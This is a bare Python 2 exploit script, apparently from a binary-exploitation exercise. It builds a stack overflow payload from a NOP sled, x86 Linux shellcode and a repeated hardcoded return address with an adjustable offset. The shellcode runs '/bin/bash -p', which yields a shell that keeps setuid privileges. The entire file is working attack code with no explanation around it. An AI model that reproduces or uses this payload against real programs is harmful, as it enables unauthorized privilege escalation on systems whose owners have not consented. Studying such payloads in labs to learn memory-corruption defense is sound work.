#!/usr/bin/python
import struct
import sys

if len(sys.argv) == 1:
    offset = 0
else:
    offset = int(sys.argv[1])

nop = '\x90'
brk = '\xcc'
shellcode = "\x31\xc0\x6a\x68" + \
            "\x68\x2f\x62\x61" + \
            "\x73\x68\x2f\x62" + \
            "\x69\x6e\x89\xe3" + \
            "\x68\x2d\x70\xff" + \
            "\xff\xc1\x24\x24" + \
            "\x10\xc1\x2c\x24" + \
            "\x10\x89\xe1\x50" + \
            "\x51\x53\x89\xe1" + \
            "\x8d\x51\x04\x04" + \
            "\x05\x04\x06\xcd" + \
            "\x80"
shellcode = nop * 3 + shellcode
sled = nop * 32

addr = struct.pack("<I", 0xffffcf08 + 16 + offset)

s = sled + shellcode + addr * 40
print s
